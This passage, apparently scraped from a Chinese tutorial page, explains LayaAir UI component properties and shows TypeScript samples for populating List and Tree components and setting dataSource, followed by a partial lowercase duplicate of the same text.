viewport：视口大小(格式:x,y,width,height)，视口外的子对象，将不被渲染；适用于RPG类游戏\n\nScene不能进行相对布局的，所以没有left、right、top、bottom、centerX、centerY这些属性\n\n\n# View\n\nView 是一个常用的显示面板或者说是显示模块，比如游戏中底部的经验条、左上角的角色信息、侧边的功能区域等等\n因为View是继承自Scene，所以Scene有的属性，它大部分都有，有个别不同的：\n\n * 旋转及缩放\n   * anchorX：X轴锚点，值为0-1（用于相对定位；View有left、right、top、bottom、centerX、centerY这些属性，可以相对定位）\n   * anchorY：Y轴锚点，值为0-1\n   * pivotX：View没有该属性\n   * pivotY：View没有该属性\n   * skewX：View没有该属性\n   * skewY：View没有该属性\n   * ration：View没有该属性\n   * alpha：View没有该属性\n\nPS：anchor是相对于父节点的参考点，而pivot是相对于本身的旋转、缩放等参考点\n\n\n# Dialog\n\nDialog 是弹窗，也是游戏中常用的模块，用于显示提示信息或者对话框等\n因为Dialog是继承自View，所以View有的属性，它大部分都有，它也有自己独有的：\n\n * 常用\n   * dragArea：拖动区域(格式:x, y, width, height)，一般设置在弹窗的顶部区域，按住弹窗的顶部就可以就行拖动了，比较适用于任务提示、线路提示等一些可以自定义拖动的弹窗\n   * isModal：是否是模式窗口，默认是false点击是穿透的，设置为true的话点击弹窗就不会穿透到后面\n   * isShowEffect：是否显示弹出效果，默认带了弹出效果\n   * isPopupCenter：指定对话框是否居中弹出，默认是居中弹出的\n\n\n# 切片组件\n\n切片是对位图在一个方向上进行等比切割（裁剪）；FontClip继承自Clip\n\n\n# Clip\n\n * 常用\n   * autoPlay：是否自动播放，默认false\n   * clipWidth：单切片宽度(优先级高于clipX)\n   * clipHeight：单切片高度(优先级高于clipY)\n   * clipX：切片X轴数量(通常使用这个)\n   * clipY：切片Y轴数量(通常使用这个)\n   * index：当前帧位置，也就是当前显示的是哪一个，从0开始\n * 其他\n   * interval：动画播放间隔(单位毫秒)，时钟、倒计时和计时器可以使用这个\n\n\n# FontClip\n\n推荐使用 FontClip ，非常常用的，特殊的文本和字体需要使用它 因为FontClip是继承自Clip，所以Clip有的属性，它大部分都有，它也有自己独有的：\n\n * 常用\n   * align：水平对齐方式\n   * sheet：位图内容范围（文字就直接写文字，如果是图片就使用索引）\n   * value：位图数字内容（显示值，文字或索引）\n   * spaceX：X方向项间隔（字间距）\n   * spaceY：Y方向项间隔（字间距）\n   * direction：排列方向（一般是横着显示horizontal，也可以竖着显示vertical）\n\n\n# 文本组件\n\n\n# FillText\n\nFillText是一个Graphics绘制的文本，动态文本建议使用FillText，静态文本用Text或Label；因为动态的文本在使用Text会创建新图集比较耗内存，而FillText是 使用旧图集或一个字一个字提交（创建效率低一些），图集利用率和共享好，但是复杂的“蝌蚪文”不建议使用FillText（中英文可以），分割时可能会出错。\n\n * 公用\n   * renderType：渲染类型，空值就是作为文本显示在画布上；hit：只作为鼠标点击区域，不会显示在画布上；unHit：不可点击区域，也不会显示在画布上；\n * 常用\n   * text：文本内容（不换行）\n   * font：字体（比较特殊，可以写字体、大小、斜体、粗体等等）\n   * color：字体颜色（支持16进制、rgb和颜色英文名）\n   * textAlign：对齐方式（跟普通的也有区别，不是在整个文本区域里对齐的）\n\n\n# Text\n\nText 最基础的2D文本组件\n\n * 常用\n   * text：文本内容（不换行）\n   * font：字体（只是设置文本字体样式）\n   * fontSize：字体大小\n   * bold：是否粗体\n   * color：文字颜色\n   * italic：是否为斜体\n   * align：水平对齐方式\n   * valign：垂直对齐方式\n   * wordWrap：文本是否自动换行，默认为false，不可自动换行\n   * leading：垂直padding行间距（以像素为单位）\n   * padding：边距信息(上边距，右边距，下边距 , 左边距)\n   * overflow：文本超出文本域后的行为（visible不进行任何裁切，hidden超出后隐藏，scroll超出后可以滚动查看）\n   * stroke：描边宽度\n   * strokeColor：描边颜色\n\n\n# Label\n\nLabel 是封装了Text的UI文本组件，Text有的属性Label基本也有，介绍一下Label独有的属性：\n\n * 常用\n   * text：文本内容（可换行，加\\n）\n   * bgColor：背景颜色（文本域的背景颜色）\n   * borderColor：文本边框颜色\n   * underline：是否显示下划线\n   * underlineColor：下划线颜色\n\n如果 没有相对布局、文字换行、下划线 等这些需求，使用Text要比Label 性能更好一些\n\n\n# TextInput\n\n输入框 TextInput 继承自label，有label的绝大部分属性，因为是输入框所以也有自己独有的属性：\n\n * 常用\n   * sizeGrid：九宫格信息(格式:上边距,右边距,下边距,左边距,是否平铺(0或1，可选))\n   * skin：背景皮肤\n   * type：输入框类型(text,password,email,url,number,range,date,month,week,time,datetime,datetime-local,searc)\n   * maxChars：最大字符数\n   * restrict：限制输入的字符，输入到这里的，是只能输入这些。不建议开启。适用于简单的文本。不支持反斜杠(中文在PC和手机情况不一样，也不建议)\n   * prompt：输入前提示文本\n   * promptColor：输入提示文本的颜色\n   * editable：设置可编辑状态\n   * multiline：是否是文本域。 值为true表示当前是文本域，可多行输入，否则不是文本域。（在简单情况下可以取代textArea）\n\n\n# TextArea\n\n虽然 TextInput 使用 multiline 可以实现多行文本域的效果，但是可能会 需要用到滚动条什么的，这时候用到 TextArea 会比较好\n\n * 常用\n   * vScrollBarSkin：添加垂直滚动条皮肤\n   * hScrollBarSkin：添加水平滚动条皮肤\n\n\n# HTMLDivElement\n\nHTMLDivElement 富文本，常用于 聊天面板或者复杂图文混排 里；引擎对H5标签进行解析，然后渲染绘制到画布上，它并不是标准的H5元素（Laya支持常用的H5标签解析）；可以派发link事件的富文本，如果有href，可以在href里携带参数，后面接收link事件时也会接收该参数。\n\n * innerHTML：html内容\n\n\n# 滚动条与裁剪面板容器\n\n\n# ScrollBar\n\n水平滚动条 HScrollBar 和垂直滚动条 VScrollBar 都是继承自 ScrollBar\n\n * 常用\n   * max：最大滚动位置\n   * min：最小滚动位置\n   * scrollSize：点击按钮滚动量,每点击一次方向按钮，滚动条的值改变多大\n   * value：滚动条当前进度值\n   * mouseWheelEnable：是否滚轮滚动(PC)，默认为true\n   * touchScrollEnable：是否触摸滚动(触摸屏)，默认为true\n   * hide：是否隐藏滚动条，不显示滚动条，但是可以正常滚动，默认为false\n   * autoHide：是否自动隐藏滚动条，无需滚动时隐藏滚动条，内容需要滚动时显示滚动条。默认为true\n   * showButtons：是否显示按钮，默认为true（移动端一般不需要）\n   * scaleBar：是否自动缩放滑动条，默认值为true，为false时，滑动条固定不变\n   * rollRatio：滚动衰减系数，默认为0.95（平滑过渡效果）\n   * elasticDistance：橡皮筋效果极限距离，0为没有橡皮筋效果（超过顶部或底部会回弹）\n   * elasticBackTime：橡皮筋回弹时间，单位为毫秒\n\n\n# Panel\n\n带滚动条的显示面板容器，有固定宽高，给它设置滚动条后，超过panel宽高的内容可以通过滚动条来显示\n\n * 常用\n   * hScrollBarSkin：水平滚动条皮肤\n   * vScrollBarSkin：垂直滚动条皮肤\n   * elasticEnabled：是否使用橡皮筋效果，默认为false\n\n\n# 进度条与滑动条\n\n\n# ProgressBar\n\n进度条ProgressBar，常用于场景切换之前的资源加载界面\n\n * 常用\n   * value：当前进度范围是0到1\n\n\n# Slider\n\n水平滑动条 HSlider 和垂直滑动条 VSlider 都是继承自 Slider\n\n * 常用\n   * max：滑块上允许的最大值\n   * min：滑块上允许的最小值\n   * showLabel：是否显示标签，默认为true，该标签的文字样式改不了\n   * tick：刻度值的最小单位（在标签上显示比较明显）\n   * value：当前所在刻度\n   * allowClickBack：为true时，可以通过点击滑动条目标区域，快速跳转到当前所在刻度（改变value值），为false时禁止通过点击改变value值\n\n\n# 按钮、多选框、单选框与单选框组\n\n\n# Button\n\n游戏中常见的按钮组件\n\n * 常用\n   * toggle：为true时，可以通过点击切换按钮显示状态。为false时，点击后会直接恢复初始状态\n   * stateNum：皮肤的状态数，支持单态，两态和三态按钮（正常态、滑入、按下）（正常态、滑入）\n   * selected：是否选中（按下或滑入）\n   * label：按钮的文本标签\n   * labelFont：标签字体\n   * labelSize：标签大小\n   * labelBold：标签加粗\n   * labelColors：鼠标在元素释放时、鼠标移动到元素时、鼠标按下时各个状态下的标签颜色(格式:upColor鼠标释放,overColor处于上方,downColor鼠标按下)\n   * labelAlign：标签对齐模式，默认为居中对齐\n   * labelPadding：按钮文本标签的边距。 格式：上边距,右边距,下边距,左边距\n   * labelStroke：描边宽度（以像素为单位）。 默认值0，表示不描边\n   * labelStrokeColor：描边颜色，以字符串表示。 默认值为 #000000（黑色）strokeColors\n   * strokeColors：鼠标在元素释放时(抬起移开)、鼠标移动到元素时、鼠标按下时各个状态下的描边颜色(格式:upColor,overColor,downColor)\n\n\n# CheckBox\n\n多选框CheckBox是继承自Button的，它相比于Button会 少一个labelAlign属性，可以使用 labelPadding来调整多选框的文本 。\n\n\n# Radio和RadioGroup\n\n单选框Radio是继承自Button的，而单选框组RadioGroup是用于 存放一组Radio的容器；Radio的属性跟Button一样，RadioGroup跟Button有一部分属性是一样，还有一些自己独有的：\n\n * 常用\n   * labels：标签集合（该单选框组里有多少个单选框，就写他们的名字）\n   * space：间隔（单选框之间的间隔）\n   * direction：排列方向（横向horizontal，纵向vertical）\n   * selectedIndex：选择索引，默认-1\n   * bgColor：边线颜色\n\n可以 选中多个Radio，然后转换为RadioGroup，这样自定义的RadioGroup有两个地方要注意，一是 每个item要规范命名，例如“item0、item1、item2、item3”；二是 不能在RadioGroup的labels给每个单选框取名了，要到每个单选框自己的label上设置。\n\n\n# 切换标签与导航布局器\n\n\n# Tab\n\nTab和RadioGroup都继承自UIGroup，UIGroup继承自Box；Tab同样可以使用组件库里的Tab，也可以选中一些组件然后转换为Tab，同样也要注意命名的问题。\nTab跟RadioGroup有相同的属性，只是多了一个 labelAlign标签对齐模式。\n\n\n# ViewStack\n\nViewStack通常跟Tab配套使用，导航栏对应面板来显示，ViewStack里面会存放Box或者Image这样的显示内容（命名通常是 item0、item1、item2、item3），切换Tab时对应的ViewStack也要切换\n\n * 常用\n   * selectedIndex：选择索引\n\n\n# 基础容器与排版容器\n\n\n# Box\n\nBox是整个容器组件的基础类，所有的容器组件都是继承自Box；Box可以作为 任何显示组件的容器，可以相对布局，其子节点也能绝对布局，它还可以作为List或tree的渲染项。\n\n\n# VBox\n\nVBox比Box多了垂直布局，最后显示出来的全是排列垂直的（从上到下排列），区别就是align是左对齐还是右对齐还是居中对齐\n\n * 常用\n   * space：子对象的间隔\n   * align：布局元素的水平对齐\n\n\n# HBox\n\nHBox比Box多了水平布局，最后显示出来的全是排列水平（从左到右排列），区别就是align是以顶部对齐还是以底部对齐还是居中对齐\n\n * 常用\n   * space：子对象的间隔\n   * align：布局元素的水平对齐\n\n\n# 列表组件\n\n\n# List\n\nList列表组件常用于游戏中 排行榜、商店等，List包含基础的渲染项，每一项的UI构成基本相同，只是 渲染数据不同 而已。\n通常的做法是 先构建渲染项Box，将它的renderType设置为render，再选中渲染项Box将其转换成容器Ctrl+B，也就是转换成List容器。\n这样还不够，还需要设置List的大小还有xy方向的渲染数量等等属性：\n\n * 常用\n   * repeatX：X方向项数量（不设置的话，将按照渲染项和List宽高关系进行渲染）\n   * repeatY：Y方向项数量（不设置的话，将按照渲染项和List宽高关系进行渲染）\n   * elasticEnabled：是否使用橡皮筋效果，默认为false\n   * spaceX：X方向项间隔（渲染项之间的间隔）\n   * spaceY：Y方向项间隔\n   * vScrollBarSkin：垂直滚动条皮肤（不使用皮肤可以使用空格替代）\n   * hScrollBarSkin：水平滚动条皮肤（不使用皮肤可以使用空格替代）\n   * selectEnable：是否可以选中\n   * selectedIndex：当前选择的项索引\n\nList的渲染项也可以使用View，这样的好处是通用的渲染可以共用维护起来也方便，坏处就是UI多了可能会凌乱找不到对应的渲染项源文件。\n\nList的渲染项赋值（array字段）：\n\nexport default class ListUI extends Laya.Dialog {\n    constructor() { super(); }\n    onEnable(): void {\n        //模拟数据结构\n        let arr = [{\n            "top": { "value": "1" },\n            "name": { "text": "玩家名字1", "fontSize": 30, },\n            "score": { "text": "100" }\n        }, {\n            "top": { "value": "2" },\n            "name": { "text": "玩家名字2", "fontSize": 30, },\n            "score": { "text": "90" }\n        }, {\n            "top": { "value": "3" },\n            "name": { "text": "玩家名字3", "fontSize": 30, },\n            "score": { "text": "80" }\n        }];\n\n        let _list = this.getChildByName("_list") as Laya.List;\n        _list.array = arr;\n\n        //刷新List\n        _list.refresh();\n    }\n    onDisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 下拉列表选项框\n\n\n# ComboBox\n\n下拉框组件ComboBox其实是Button组件和List组件组合而成的\n\n * 常用\n   * labels：下拉选项的标签文本集合\n   * labelFont：选中的标签字体\n   * labelSize：选中的标签文本大小\n   * labelBold：选中的标签文本加粗\n   * labelColors：鼠标在元素释放时(抬起移开)、鼠标移动到元素之上时、鼠标按下时选中的标签颜色(格式:upColor,overColor,downColor)\n   * labelPadding：选中的标签文本边距。 格式：上边距,右边距,下边距,左边距\n   * itemSize：项字体大小\n   * itemColors：下拉选项列表的各种颜色(格式:鼠标滑过时的渲染项背景色overBgColor,鼠标滑过的渲染项文本颜色overLabelColor,鼠标滑出的默认文本颜色outLableColor,边框颜色borderColor,背景颜色bgColor)\n   * skin：下拉框按钮皮肤地址\n   * stateNum：按钮的状态值\n   * visibleNum：下拉列表中可显示的最大行数\n   * scrollBarSkin：滚动条皮肤（想要滚动条但不想要皮肤，可以将值设置一个空格）\n   * selectedIndex：按索引值设置显示默认值\n   * selectedLabel：按标签文本设置显示默认值\n   * sizeGrid：九宫格信息(格式:上边距,右边距,下边距,左边距,是否平铺(0或1，可选))\n\n\n# 三种UI预设方法\n\n预设 就是提前把组件、功能面板或页面设置好，可以达到重用复用的目的，提高开发效率。\n\n 1. 对资源的预设：在资源库里双击已经命名好的组件，在“默认全局属性”里添加你想要预设的属性（预设属性时不要加空格、引号）\n    \n 2. 对功能面板的预设：将UI里重复使用的面板（例如List中的渲染项）单独拿出来制作成View，然后使用时直接将其拖拽到目的UI上即可\n    \n 3. “保存为预制体”：选中你的UI，然后在属性管理面板的右上角找到“保存预设”按钮，点击它再设置好名称就可以保存为预制体了\n\n第2种和第3种的区别：都可以在预设里面添加和修改内容，保存修改后的预设会在使用预设的地方会生效；不同的就是预制体使用的地方，是复制了一份预制体UI结构，可以 单独修改它也不会影响预制体，像第2种就不能在使用预设的地方修改。\n\n\n# 树结构组件\n\n\n# Tree\n\n树结构组件 Tree常 用于文件展示或者目录章节展示。\nTree的创建和List类似，它的渲染项一般是Box或者预设（renderType也是render），比较常见的属性有：\n\n * 常用\n   * scrollBarSkin：滚动条皮肤\n   * selectedIndex：当前选择的项索引\n   * spaceBottom：项间隔距离\n   * spaceLeft：左侧缩进距离\n   * keepStatus：数据源发生变化后，是否保持之前打开状态，默认为true。\n   * bgColor：背景颜色（整个Tree的背景颜色）\n\nTree的渲染项赋值（xml字段）：\n\nexport default class tree extends Laya.Tree {\n    constructor() { super(); }\n    onEnable(): void {\n           //组装tree的模拟数据\n           let treeData = "<data>";\n           for (let i = 0; i < 5; ++i) {\n                treeData += "<item aaa=\'目录 " + (i + 1) + "\' isOpen=\'false\'>";\n                for (let j = 0; j < 5; ++j) {\n                     treeData += "<leaf aaa=\'文件 " + (j + 1) + "\'/>";\n                }\n                treeData += "</item>";\n           }\n           treeData += "</data>";\n           // 将组装的字符串数据解决为xml\n        let xml = Laya.Utils.parseXMLFromString(treeData);\n        // this本身就是Tree，直接赋值给xml字段\n        this.xml = xml;\n    }\n    onDisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nTree展开有个坑点：背景图的名字必须是selectBox，折叠图标名字必须是arrow，文件图标名字必须是folder，而label名可以随意\n\n\n\n# 数据源和节点属性赋值\n\n组件在使用时有一个 dataSource字段，它就是组件的数据源，在这个数据源里可以修改组件的属性，在运行时就会覆盖之前在IDE上设置的组件属性。注意：Sprite和UIComponent这一脉才有dataSource字段，Scene那一脉是没有的。\n\n * 这里是将btn继承了Laya.Button，然后将这个脚本放到组件的runtime里，当组件被启用执行后就会修改DataSource：\n\nexport default class btn extends Laya.Button {\n    constructor() { super(); }\n    onEnable(): void {\n        // 数据源，对属性进行重新赋值\n        this.dataSource = {"labelSize":50,"label":"按钮"};\n        // 获取子节点（子节点的name属性要设置了值才可以通过getChildByName获取到）\n        let son = this.getChildByName("aaa") as Laya.Label;\n        // 对子节点属性进行重新复制\n        son.dataSource =  {"fontSize":50,"text":"按钮子节点文本","color":"#000fff"};\n    }\n    onDisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n * dataSource除了在runtime脚本里使用，也可以通过“添加组件”使用，但不是继承Laya.Button这样的UI了，是继承Laya.Script了：\n\nexport default class scriptDatasource extends Laya.Script {\n    /** @prop {name:intType, tips:"整数类型示例", type:Int, default:1000}*/\n    public intType: number = 1000;\n    /** @prop {name:numType, tips:"数字类型示例", type:Number, default:1000}*/\n    public numType: number = 1000;\n    /** @prop {name:strType, tips:"字符串类型示例", type:String, default:"hello laya"}*/\n    public strType: string = "hello laya";\n    /** @prop {name:boolType, tips:"布尔类型示例", type:Bool, default:true}*/\n    public boolType: boolean = true;\n    // 更多参数说明请访问: https://ldc2.layabox.com/doc/?nav=zh-as-2-4-0\n\n    constructor() { super(); }\n\n    onEnable(): void {\n        (this.owner as Laya.UIComponent).dataSource = {"text":"我是文本"};\n    }\n\n    onDisable(): void {\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n * 然后如下图，直接将该脚本拖到Label节点下或者点击左侧属性管理面板中的“添加组件”\n   \n\n\n# 修改IDE中属性的位置\n\n先进入Basics所在目录\n\n再刚刚目录的上级目录也就是layaEditor目录然后进入renders目录，找到laya.editorUI.xml文件，修改里面属性位置即可',normalizedContent:'# 常用组件详解\n\n\n# 图像组件\n\n\n# sprite\n\nsprite 的创建：在层级面板里右击，再选择“创建sprite节点”；不符合laya基础组件命名规则的，拖拽到场景里或者层级面板里，都算作sprite组件。\nsprite相对于image要 性能更好一些，但是无法进行相对布局，也不能设置九宫格，也没有数据源。\nsprite属性介绍：\n\n * 公用\n   * var：在场景里声明一个唯一的名字（直接this.xxx来调用），方便在代码模式里调用组件；如果发布模式是“文件模式”，由于没有场景类就不能使用var了\n   * name：也是组件的名字，但 不是全局的，只能通过父级的 getchildbyname方法 来调用\n   * 位置布局：主要用于在场景里快捷布局\n * 常用\n   * runtime：运行时的逻辑类，也就是组件的脚本，将脚本代码拖拽到runtime处即可关联\n   * texture：纹理地址（图片地址，皮肤skin），将图片拖拽到texture处即可快速填写纹理地址\n   * visible：是否显示，默认为true\n * 宽高及位置\n   * x：x轴坐标\n   * y：y轴坐标\n   * width：宽度\n   * height：高度\n * 旋转及缩放\n   * pivotx：x轴心点，以像素为单位，影响缩放中心、旋转中心和显示位置；左上角的小黄点\n   * pivoty：y轴心点，以像素为单位，影响缩放中心、旋转中心和显示位置\n   * scalex：水平缩放，默认为1\n   * scaley：垂直缩放，默认为1\n   * skewx：水平倾斜角度\n   * skewy：垂直倾斜角度\n   * ration：旋转的角度\n   * alpha：透明度（0-1）\n * 其他\n   * blendmode：混合模式；为lighter时，两张图片叠加，上层的图会混合底层的颜色\n   * cacheas：缓存组件，none为不缓存（默认值），normal只缓存命令（优化节点数），bitmap缓存为位图（优化drawcall），静态面板可以开启cacheas优化\n   * drawcalloptimize：为true时开启drawcall优化；引擎绘制时自动将所有文本提到显示最上层（相当于层级的最上层），避免同一个图集内的图像绘制时被文本打断，可以减少drawcall数量，如果存在 文字遮挡的需求，就不要开启drawcalloptimize，因为drawcalloptimize开启后 刚开始文本可能不会被遮挡了\n   * hittestprior：指定鼠标事件监测是优先监测自身还是优先监测其子对象。默认为true，优先监测自身，如果 没有监测到就中断监测，表示没有命中。为false的话，优先监测其子对象，监测到子对象就会中断监测，获得命中目标；如果没有命中任何子对象才会去监测对象本身。\n   * mouseenabled：是否接受鼠标事件，关闭后hittestprior不会再监测这个节点\n   * mousethrough：当mouseenabled为true时，mousethrough才生效，用于修正点击区域的属性；mousethrough默认为 false，节点设置的宽高为点击区域（hittestprior为false的话点击区域还会包含子对象）并穿透不了，如果没有设置宽高那就直接穿透了；mousethrough为 true 时，不管设置宽高与否，显示的内容（可见部分） 就是点击区域并穿透不了，其他地方是穿透的（多个矢量图之间很特殊，是不穿透的）\n   * rendertype：渲染类型；mask作为遮罩体渲染（子节点的形状会作为父节点的一个遮罩体），render作为list渲染项渲染，instance使用单例方式实例\n   * zorder：层级z方向的顺序，值越大越靠上\n\ntexture一般会依托于sprite来显示，也可以在image上显示，但在sprite上更好（性能好也轻便），多个texture在sprite上只会显示一个。\n\n\n# image\n\nimage 继承自uicomponent再继承自sprite，所以image有sprite的属性，也有自己单独的属性。\n可以相对布局，可以设置九宫格，有数据源。\n\n * 常用\n   * sizegrid：九宫格，主要 用于拉伸而又不影响边缘的情况，只拉伸中间无影响的部分\n   * skin：同texture，是图片资源的地址\n   * group：加载分组，设置后可以按照组管理资源\n * 宽高及位置（与sprite最主要的区别，可以 相对布局）\n   * left：居父容器左边的距离\n   * right：居父容器右边的距离\n   * top：居父容器上边的距离\n   * bottom：居父容器底边的距离\n   * centerx：水平居中偏移位置\n   * centery：垂直居中偏移位置\n * 其他\n   * disabled：是否禁用，禁用后会置灰，同时不接收鼠标事件\n   * gray：是否变灰，只变灰，接收鼠标事件\n\n\n# 视图组件\n\n视图组件的创建是在“工程-scenes”里创建的，如下图\n\n\n会看到视图组件有三种：scene、view、dialog；它们的关系是 dialog继承自view，view继承自scene。\n\n * 视图组件有个 预加载功能，这个功能按钮在右上角，你可以让一些资源 不预加载，对应资源的打包方式要改为 “不打包”\n * 别名 是在ide里显示用的，实际没有什么意义\n * 在属性里修改宽高，在场景设置里会自动对应修改\n\n\n# scene\n\nscene 是场景，用于游戏中的主场景、战斗场景、副本场景等等\n\n * 常用\n   * scenecolor：参考背景颜色（实际运行中没有）\n   * autodestroyatclosed：场景被关闭后，是否自动销毁（销毁节点和使用到的资源），默认为false；更灵活地管理资源可以手动去销毁\n * 其他\n   * viewport：视口大小(格式:x,y,width,height)，视口外的子对象，将不被渲染；适用于rpg类游戏\n\nscene不能进行相对布局的，所以没有left、right、top、bottom、centerx、centery这些属性\n\n\n# view\n\nview 是一个常用的显示面板或者说是显示模块，比如游戏中底部的经验条、左上角的角色信息、侧边的功能区域等等\n因为view是继承自scene，所以scene有的属性，它大部分都有，有个别不同的：\n\n * 旋转及缩放\n   * anchorx：x轴锚点，值为0-1（用于相对定位；view有left、right、top、bottom、centerx、centery这些属性，可以相对定位）\n   * anchory：y轴锚点，值为0-1\n   * pivotx：view没有该属性\n   * pivoty：view没有该属性\n   * skewx：view没有该属性\n   * skewy：view没有该属性\n   * ration：view没有该属性\n   * alpha：view没有该属性\n\nps：anchor是相对于父节点的参考点，而pivot是相对于本身的旋转、缩放等参考点\n\n\n# dialog\n\ndialog 是弹窗，也是游戏中常用的模块，用于显示提示信息或者对话框等\n因为dialog是继承自view，所以view有的属性，它大部分都有，它也有自己独有的：\n\n * 常用\n   * dragarea：拖动区域(格式:x, y, width, height)，一般设置在弹窗的顶部区域，按住弹窗的顶部就可以就行拖动了，比较适用于任务提示、线路提示等一些可以自定义拖动的弹窗\n   * ismodal：是否是模式窗口，默认是false点击是穿透的，设置为true的话点击弹窗就不会穿透到后面\n   * isshoweffect：是否显示弹出效果，默认带了弹出效果\n   * ispopupcenter：指定对话框是否居中弹出，默认是居中弹出的\n\n\n# 切片组件\n\n切片是对位图在一个方向上进行等比切割（裁剪）；fontclip继承自clip\n\n\n# clip\n\n * 常用\n   * autoplay：是否自动播放，默认false\n   * clipwidth：单切片宽度(优先级高于clipx)\n   * clipheight：单切片高度(优先级高于clipy)\n   * clipx：切片x轴数量(通常使用这个)\n   * clipy：切片y轴数量(通常使用这个)\n   * index：当前帧位置，也就是当前显示的是哪一个，从0开始\n * 其他\n   * interval：动画播放间隔(单位毫秒)，时钟、倒计时和计时器可以使用这个\n\n\n# fontclip\n\n推荐使用 fontclip ，非常常用的，特殊的文本和字体需要使用它 因为fontclip是继承自clip，所以clip有的属性，它大部分都有，它也有自己独有的：\n\n * 常用\n   * align：水平对齐方式\n   * sheet：位图内容范围（文字就直接写文字，如果是图片就使用索引）\n   * value：位图数字内容（显示值，文字或索引）\n   * spacex：x方向项间隔（字间距）\n   * spacey：y方向项间隔（字间距）\n   * direction：排列方向（一般是横着显示horizontal，也可以竖着显示vertical）\n\n\n# 文本组件\n\n\n# filltext\n\nfilltext是一个graphics绘制的文本，动态文本建议使用filltext，静态文本用text或label；因为动态的文本在使用text会创建新图集比较耗内存，而filltext是 使用旧图集或一个字一个字提交（创建效率低一些），图集利用率和共享好，但是复杂的“蝌蚪文”不建议使用filltext（中英文可以），分割时可能会出错。\n\n * 公用\n   * rendertype：渲染类型，空值就是作为文本显示在画布上；hit：只作为鼠标点击区域，不会显示在画布上；unhit：不可点击区域，也不会显示在画布上；\n * 常用\n   * text：文本内容（不换行）\n   * font：字体（比较特殊，可以写字体、大小、斜体、粗体等等）\n   * color：字体颜色（支持16进制、rgb和颜色英文名）\n   * textalign：对齐方式（跟普通的也有区别，不是在整个文本区域里对齐的）\n\n\n# text\n\ntext 最基础的2d文本组件\n\n * 常用\n   * text：文本内容（不换行）\n   * font：字体（只是设置文本字体样式）\n   * fontsize：字体大小\n   * bold：是否粗体\n   * color：文字颜色\n   * italic：是否为斜体\n   * align：水平对齐方式\n   * valign：垂直对齐方式\n   * wordwrap：文本是否自动换行，默认为false，不可自动换行\n   * leading：垂直padding行间距（以像素为单位）\n   * padding：边距信息(上边距，右边距，下边距 , 左边距)\n   * overflow：文本超出文本域后的行为（visible不进行任何裁切，hidden超出后隐藏，scroll超出后可以滚动查看）\n   * stroke：描边宽度\n   * strokecolor：描边颜色\n\n\n# label\n\nlabel 是封装了text的ui文本组件，text有的属性label基本也有，介绍一下label独有的属性：\n\n * 常用\n   * text：文本内容（可换行，加\\n）\n   * bgcolor：背景颜色（文本域的背景颜色）\n   * bordercolor：文本边框颜色\n   * underline：是否显示下划线\n   * underlinecolor：下划线颜色\n\n如果 没有相对布局、文字换行、下划线 等这些需求，使用text要比label 性能更好一些\n\n\n# textinput\n\n输入框 textinput 继承自label，有label的绝大部分属性，因为是输入框所以也有自己独有的属性：\n\n * 常用\n   * sizegrid：九宫格信息(格式:上边距,右边距,下边距,左边距,是否平铺(0或1，可选))\n   * skin：背景皮肤\n   * type：输入框类型(text,password,email,url,number,range,date,month,week,time,datetime,datetime-local,searc)\n   * maxchars：最大字符数\n   * restrict：限制输入的字符，输入到这里的，是只能输入这些。不建议开启。适用于简单的文本。不支持反斜杠(中文在pc和手机情况不一样，也不建议)\n   * prompt：输入前提示文本\n   * promptcolor：输入提示文本的颜色\n   * editable：设置可编辑状态\n   * multiline：是否是文本域。 值为true表示当前是文本域，可多行输入，否则不是文本域。（在简单情况下可以取代textarea）\n\n\n# textarea\n\n虽然 textinput 使用 multiline 可以实现多行文本域的效果，但是可能会 需要用到滚动条什么的，这时候用到 textarea 会比较好\n\n * 常用\n   * vscrollbarskin：添加垂直滚动条皮肤\n   * hscrollbarskin：添加水平滚动条皮肤\n\n\n# htmldivelement\n\nhtmldivelement 富文本，常用于 聊天面板或者复杂图文混排 里；引擎对h5标签进行解析，然后渲染绘制到画布上，它并不是标准的h5元素（laya支持常用的h5标签解析）；可以派发link事件的富文本，如果有href，可以在href里携带参数，后面接收link事件时也会接收该参数。\n\n * innerhtml：html内容\n\n\n# 滚动条与裁剪面板容器\n\n\n# scrollbar\n\n水平滚动条 hscrollbar 和垂直滚动条 vscrollbar 都是继承自 scrollbar\n\n * 常用\n   * max：最大滚动位置\n   * min：最小滚动位置\n   * scrollsize：点击按钮滚动量,每点击一次方向按钮，滚动条的值改变多大\n   * value：滚动条当前进度值\n   * mousewheelenable：是否滚轮滚动(pc)，默认为true\n   * touchscrollenable：是否触摸滚动(触摸屏)，默认为true\n   * hide：是否隐藏滚动条，不显示滚动条，但是可以正常滚动，默认为false\n   * autohide：是否自动隐藏滚动条，无需滚动时隐藏滚动条，内容需要滚动时显示滚动条。默认为true\n   * showbuttons：是否显示按钮，默认为true（移动端一般不需要）\n   * scalebar：是否自动缩放滑动条，默认值为true，为false时，滑动条固定不变\n   * rollratio：滚动衰减系数，默认为0.95（平滑过渡效果）\n   * elasticdistance：橡皮筋效果极限距离，0为没有橡皮筋效果（超过顶部或底部会回弹）\n   * elasticbacktime：橡皮筋回弹时间，单位为毫秒\n\n\n# panel\n\n带滚动条的显示面板容器，有固定宽高，给它设置滚动条后，超过panel宽高的内容可以通过滚动条来显示\n\n * 常用\n   * hscrollbarskin：水平滚动条皮肤\n   * vscrollbarskin：垂直滚动条皮肤\n   * elasticenabled：是否使用橡皮筋效果，默认为false\n\n\n# 进度条与滑动条\n\n\n# progressbar\n\n进度条progressbar，常用于场景切换之前的资源加载界面\n\n * 常用\n   * value：当前进度范围是0到1\n\n\n# slider\n\n水平滑动条 hslider 和垂直滑动条 vslider 都是继承自 slider\n\n * 常用\n   * max：滑块上允许的最大值\n   * min：滑块上允许的最小值\n   * showlabel：是否显示标签，默认为true，该标签的文字样式改不了\n   * tick：刻度值的最小单位（在标签上显示比较明显）\n   * value：当前所在刻度\n   * allowclickback：为true时，可以通过点击滑动条目标区域，快速跳转到当前所在刻度（改变value值），为false时禁止通过点击改变value值\n\n\n# 按钮、多选框、单选框与单选框组\n\n\n# 